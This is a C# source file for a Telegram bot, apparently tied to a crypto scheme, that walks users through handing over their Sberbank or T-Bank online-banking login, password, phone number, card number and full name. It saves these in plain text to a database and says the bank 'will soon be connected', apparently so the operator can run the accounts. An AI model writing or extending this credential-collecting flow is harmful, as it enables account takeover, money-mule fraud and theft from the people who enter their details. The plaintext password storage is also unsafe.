using BusLogic.Services;
using crypto_merge.Tg.Bot.Commands.Abstractions;
using crypto_merge.Tg.Bot.Services;
using InternetDatabase.EntityDB;
using System.Text.RegularExpressions;
using Telegram.Bot.Requests.Abstractions;
using Telegram.Bot.Types;

namespace crypto_merge.Tg.Bot.Commands.WalletPages;

public class AddWalletPage : ICallbackCommand
{
    public const string CALLBACK_KEY = "AppendRequisitePage";
    private readonly MessageSender _sender;
    private readonly WaitForUserResponse waitForUser;
    private readonly UserService userService;
    private readonly WalletService walletService;

    public string CallbackKey => CALLBACK_KEY;


    private Dictionary<string, List<Func<long, int, Task<(TypeValue typeValue, string value)?>>>> bankRequests;

    public AddWalletPage(MessageSender messageSender, WaitForUserResponse waitForUser, UserService userService, WalletService walletService)
    {
        this._sender = messageSender;
        this.waitForUser = waitForUser;
        this.userService = userService;
        this.walletService = walletService;
        bankRequests = CreateBankRequests();
    }

    Dictionary<string, List<Func<long, int, Task<(TypeValue typeValue, string value)?>>>> CreateBankRequests()
    {
        return new()
        {
            { "Сбер", [
                RequestPhoneNumber,
                RequestLogin,
                RequestPassword,
                RequestCardNumber,
                RequestFio,
            ]},
            {"Т-Банк",[
                RequestFio,
                RequestPhoneNumber,
                RequestPassword,
                RequestCardNumber,
                ] }
        };
    }

    public async Task Handler(CallbackQuery callbackQuery, string[] args)
    {
        if (callbackQuery.Message == null)
            return;
        if (args.Length > 0)
        {
            await FormAddition(callbackQuery.Message.Chat.Id, callbackQuery.Message.MessageId, args[0], callbackQuery.From);
            return;
        }
        if (await walletService.GetMyWalletAll(callbackQuery.Message.Chat.Id) > 0)
        {
            await _sender.SendMessageAsync(callbackQuery.Message.Chat.Id, "К сожалению у вас уже есть банк");
            return;
        }

        SendMessage sendMessage = new()
        {
            Text = "Выберите банк",
            KeyboardMarkup = Keyboard.CreateInline( 
                bankRequests.Keys.Select(b=> new InlineButton(b, nameof(AddWalletPage), b))),
        };

        await _sender.EditMessageAsync(callbackQuery.Message.Chat, callbackQuery.Message.MessageId, sendMessage);
    }

    private async Task FormAddition(long chatId, int messageId, string bank, User user)
    {
        if(!bankRequests.TryGetValue(bank,out var requests))
        {
            await _sender.EditMessageAsync(chatId,messageId,$"{bank} больше нельзя добавить выберите другой");
            return;
        }

        if (await userService.GetByChatIdAsync(chatId) is not { } telegramUser)
        {
            await _sender.SendMessageAsync(chatId, "К сожалению пользователь не создан, обратитесь в поддержку");
            return;
        }

        string phoneNumber = "";
        string login = "";
        string password = "";
        string cardNumber = "";
        string fio ="";

        foreach (var request in requests)
        {
            var data = await request.Invoke(chatId, messageId);
            if (data is null) 
                return;

            switch (data.Value.typeValue)
            {
                case TypeValue.PhoneNumber:
                    phoneNumber = data.Value.value;
                    break;
                case TypeValue.CartNumber:
                    cardNumber = data.Value.value;
                    break;
                case TypeValue.Password:
                    password = data.Value.value;
                    break;
                case TypeValue.Login:
                    login = data.Value.value;
                    break;
                case TypeValue.Fio:
                    fio = data.Value.value;
                    break;
                default:
                    break;
            }
        }

        var newWallet = new Wallet()
        {
            Bank = bank,
            Fio = fio,
            Login = login,
            Password = password,
            PhoneNumber = phoneNumber,
            TelegramUserId = telegramUser.Id,
            NumberCard = cardNumber,
        };

        if(await walletService.CheckAsync(newWallet))
        {
            await _sender.SendMessageAsync(chatId, "Банк уже использовался!");
            return;
        }

        await walletService.CreateAsync(newWallet);

        await _sender.EditMessageAsync(chatId, messageId, "Банк вскоре будет подключен");
    }
    private enum TypeValue
    {
        PhoneNumber,
        CartNumber,
        Password,
        Login, 
        Fio,
    }
    private async Task<(TypeValue typeValue, string value)?> RequestPhoneNumber(long chatId, int messageId)
    {
        var message = await GetMessage(chatId, messageId, "Введите номер телефона", async ms =>
        {
            if (ms.Text is not { } text)
                return null;

            if (FormatPhoneNumber(text) is not { } number)
                return "Номер должен содержать только цифры";

            ms.Text = number;
            if (await walletService.AnyPhoneNumberAsync(text))
                return "Номер уже зарегистрирован";

            return null;
        });
        return message?.Text is null? null: (TypeValue.PhoneNumber, message.Text);
    }
    private async Task<(TypeValue typeValue, string value)?> RequestLogin(long chatId, int messageId)
    {
        var login = await GetMessage(chatId, messageId, "Введите ЛОГИН, инструкция как его узнать https://telegra.ph/Uznaem-LOGIN-ot-LK-SBERBANKA-08-26");
        return login?.Text is null ? null : (TypeValue.Login, login.Text);
    }
    private async Task<(TypeValue typeValue, string value)?> RequestPassword(long chatId, int messageId)
    {
        var password = await GetMessage(chatId, messageId, "Введите пароль");
        return password?.Text is null ? null : (TypeValue.Password, password.Text);
    }
    private async Task<(TypeValue typeValue, string value)?> RequestCardNumber(long chatId, int messageId)
    {
        var message = await GetMessage(chatId, messageId, "Введите номер карты", async ms =>
        {
            if (ms.Text is not { } text)
                return null;

            ms.Text = RemoveWhitespace(text);

            if (await walletService.AnyCardNumAsync(text))
                return "Номер карты уже есть";

            return null;
        });

        return message?.Text is null ? null : (TypeValue.CartNumber, message.Text);
    }
    private async Task<(TypeValue typeValue, string value)?> RequestFio(long chatId, int messageId)
    {
        var fio = await GetMessage(chatId, messageId, "Введите ФИО");
        return fio?.Text is null ? null : (TypeValue.Fio, fio.Text);
    }

    private async Task<Message?> GetMessage(long chatId, int messageId, string messageText, Func<Message, Task<string?>> func)
    {
        await _sender.EditMessageAsync(chatId, messageId, messageText);

        while (true)
        {
            var message = await waitForUser.GetMessageAsync(chatId);
            if (message is null)
                return null;
            var errorText = await func(message);

            await _sender.DeleteMessageAsync(chatId, message.MessageId);

            if (string.IsNullOrWhiteSpace(errorText))
                return message;

            await _sender.EditMessageAsync(chatId, messageId, $"❌ {errorText}\n{messageText}");
        }
    }

    private Task<Message?> GetMessage(long chatId, int messageId, string messageText)
    {
        return GetMessage(chatId, messageId, messageText, ms => Task.FromResult<string?>(null));
    }


    static string? FormatPhoneNumber(string input)
    {
        // Удаляем все нецифровые символы
        string digits = Regex.Replace(input, @"\D", "");

        if (string.IsNullOrWhiteSpace(digits))
            return null;

        if (digits[0].Equals('7'))
            digits = "8"+digits.Remove(0,1);

        return digits;
    }
    static bool IsValidCard(string candidate)
    {
        var (sum, pos) = (0, 0);
        for (var i = candidate.Length - 1; i >= 0; i--)
        {
            var c = candidate[i];
            if (c == ' ') continue;
            if (!char.IsDigit(c)) return false;
            pos++;
            var nbr = (int)char.GetNumericValue(c);
            if ((pos & 1) == 1) sum += nbr;
            else
                sum += nbr * 2 - (nbr > 4 ? 9 : 0);
        }
        return pos > 1 && sum % 10 == 0;
    }

    static string RemoveWhitespace(string input)
    {
        return new string(input.ToCharArray()
            .Where(c => !char.IsWhiteSpace(c))
            .ToArray());
    }
}
